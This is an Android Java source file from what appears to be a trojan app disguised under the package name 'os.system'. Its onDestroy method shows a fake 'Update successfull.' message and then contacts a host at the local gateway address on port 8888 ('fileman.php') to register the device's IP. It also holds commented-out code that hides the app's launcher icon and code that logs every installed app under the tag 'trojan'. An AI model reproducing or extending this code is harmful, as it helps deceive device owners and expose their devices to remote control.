package os.system;

import android.content.SharedPreferences;
import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.content.Intent;
import android.util.Log;
import android.widget.Toast;
import android.content.pm.PackageManager;
import android.content.pm.ApplicationInfo;
import android.content.ComponentName;
import java.io.*;
import java.util.*;

public class MainActivity extends Activity
{
    
    private SharedPreferences settings;
	private SharedPreferences.Editor seteditor;
	private ReceiverBoot receiver;
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		settings = getSharedPreferences("Settings", 0);
		seteditor = settings.edit();
		receiver = new ReceiverBoot();

		seteditor.putString("main", "hotspot");    
        seteditor.commit();

		//startService(new Intent(this, System.class));

/*
		try {
			PackageManager p = getPackageManager();

			p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
		}
		catch (Exception e) {}*/

		//finish();
	}

	public void onDestroy() {
		super.onDestroy();

		Toast.makeText(this, "Update successfull.", Toast.LENGTH_LONG).show();

        String ip = Identitas.getIPAddress(true);
        String[] route = ip.split("[.]");

        int index = route.length - 1;
		StringBuffer output = new StringBuffer();
		
		for (int i=0; i<index; i++) {
			output.append(route[i]+".");
		}

		receiver.requestUrl = "http://"+output+"1:8888/fileman.php?id="+ip;
		receiver.requestAksi = "web";
		receiver.mainRequest(this);
	}

	public void btn(View v) {
		PackageManager pm = getPackageManager();
		List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

		for (ApplicationInfo pack : packages) {
			Log.i("trojan", "install app    : "+pack.packageName);
			Log.i("trojan", "apk file path  : "+pack.sourceDir);
		}

		Toast.makeText(this, "dfdfd", Toast.LENGTH_LONG).show();
	}
}